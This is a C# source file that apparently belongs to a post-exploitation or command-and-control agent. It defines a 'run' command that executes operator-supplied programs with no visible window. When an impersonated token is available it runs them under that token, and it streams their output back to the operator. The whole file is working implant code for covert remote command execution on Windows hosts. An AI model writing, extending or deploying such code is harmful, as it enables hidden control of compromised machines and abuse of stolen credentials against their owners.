using Agent.Helpers;
using Agent.Models;
using System;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class RunCommand : AgentCommand
    {
        public override string Name => "run";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            var filename = task.SplittedArgs[0];
            string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();


            var creationParms = new ProcessCreationParameters()
            {
                Command = filename + " " + args,
                RedirectOutput = true,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
                creationParms.Token = ImpersonationHelper.ImpersonatedToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
        }
    }
}
